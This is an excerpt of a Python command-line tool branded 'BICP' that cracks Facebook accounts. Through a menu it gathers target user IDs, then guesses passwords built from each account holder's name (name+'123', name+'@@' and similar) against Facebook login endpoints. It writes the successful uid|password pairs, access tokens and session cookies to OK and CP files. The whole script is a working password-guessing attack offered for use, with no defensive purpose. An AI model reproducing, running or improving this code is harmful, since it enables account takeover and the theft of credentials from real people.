...
def logo():
	...
	print("""
\x1b[0;32m╔════════════════════════════════════════════╗
\x1b[0;33m║WELCOME TO OUR TOOLS  [☢️ BICP ⚠️]                                                    ║
...
\x1b[0;33m ---------------------------------------------
    ...
    \033[2;95m 88  `8D   `88'   d8P  Y8 88  `8D        \033[1;97m[\033[1;94m+\033[1;97m] AU \033[1;93m: \033[1;97m  [Mahbub Alam Khan]
    \033[2;96m 88oooY'    88    8P      88oodD'      \033[1;97m[\033[1;94m+\033[1;97m] FB \033[1;93m: \033[1;97m fb.com/Mahbub.Alam.Khan.002
    \033[2;96m 88~~~b.    88    8b      88~~~       \033[1;97m[\033[1;94m+\033[1;97m] Page \033[1;93m: \033[1;97m BICP.Team.Help.Zone
    \033[2;94m 88   8D   .88.   Y8b  d8 88          \033[1;97m[\033[1;94m+\033[1;97m] Team \033[1;93m: \033[1;97m BICP
    \033[2;94m Y8888P' Y888888P  `Y88P' 88            \033[1;97m[\033[1;94m+\033[1;97m] CM \033[1;93m: \033[1;97m B-Api.Fb
    \033[1;97m---------------------------------------------------------
...
def menu():
	...
	elif BICP == "1" or BICP == "01":

		publik()

		method()

	elif BICP == "2" or BICP == "02":

		follower()

		method()

	elif BICP == "3" or  BICP == "03":

		massal()

		method()

	elif BICP == "4" or BICP == "04":
	...
	elif BICP == "5" or BICP == "05":

		setting_ua()

	elif BICP == "0" or BICP == "00":
...
def method():
	...
	print("\033[1;93m[\033[1;94m1\033[1;97m] B-API\033[1;97m [ \033[1;95mBICP PRO/FASTER \033[1;97m]")
...
def cek_ttl_cp(uid, pw):
	...
	try:
		...
		with requests.Session() as ses:
			...
			print("\r\033[0;95m[BICP-CP] %s|%s|%s %s %s\033[0;91m"%(uid, pw, day, month, year))
...
def bapi(user):
	...
	if len(name)>=6:
		...
		pwx = [ name, name+"123", name+"1234", name+"12345", name+"@@",name+"@#",name+"@123", ]
	...
	try:
		...
		for pw in pwx:
			...
			if "session_key" in send.text and "EAAA" in send.text:
				...
				print("\r\033[0;94m[BICP-OK] %s|%s|%s\033[0;97m"%(uid, pw, send.json()["access_token"]))
				...
				print("\r\033[0;95m[BICP-CP] %s|%s\033[0;92m        "%(uid, pw))

				cp.append("%s|%s"%(uid, pw))

				open("CP/%s.txt"%(tBICP),"a").write(" + %s|%s\n"%(uid, pw))
	...
	try:
		...
		for pw in pwx:
			...
			if "c_user" in ses.cookies.get_dict().keys():
				...
				print("\r\033[0;94m[BICP-OK] %s|%s|%s\033[0;95m"%(uid, pw, kuki))

				ok.append("%s|%s"%(uid, pw))

				open("OK/%s.txt"%(tTALHA),"a").write(" + %s|%s\n"%(uid, pw))
				...
				print("\r\033[0;95m[BICP-CP] %s|%s\033[0;96m        "%(uid, pw))
	...
	try:
		...
		for pw in pwx:
			...
			if "c_user" in ses.cookies.get_dict().keys():
				...
				print("\r\033[0;94m[BICP-OK] %s|%s|%s\033[0;97m"%(uid, pw, kuki))

				ok.append("%s|%s"%(uid, pw))

				open("OK/%s.txt"%(tBICP),"a").write(" + %s|%s\n"%(uid, pw))
				...
				print("\r\033[0;95m[BICP-CP] %s|%s\033[0;91m        "%(uid, pw))
